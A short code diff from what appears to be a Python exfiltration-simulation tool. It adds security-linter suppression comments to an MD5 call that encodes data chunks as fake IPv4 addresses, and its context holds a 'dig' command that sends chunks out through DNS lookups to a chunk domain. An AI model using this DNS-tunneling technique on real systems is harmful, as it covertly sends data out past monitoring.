@@ -287,7 +287,12 @@ class DataExfiltration:
                     # A record (IPv4) - encode chunks as fake IPs
                     query = f"dig +short A {chunk_domain}"
                     # Generate fake IPv4 from chunk data
-                    ip_bytes = hashlib.md5(chunk.encode()).digest()[:4]
+                    # nosec B324 - MD5 used to derive a deterministic fake IPv4
+                    # encoding for DNS-tunneling exfil simulation. Not used for
+                    # any cryptographic, integrity, or authentication purpose.
+                    ip_bytes = hashlib.md5(  # nosec B324
+                        chunk.encode(), usedforsecurity=False
+                    ).digest()[:4]
                     f"{ip_bytes[0]}.{ip_bytes[1]}.{ip_bytes[2]}.{ip_bytes[3]}"
                 else:
                     # Generic record
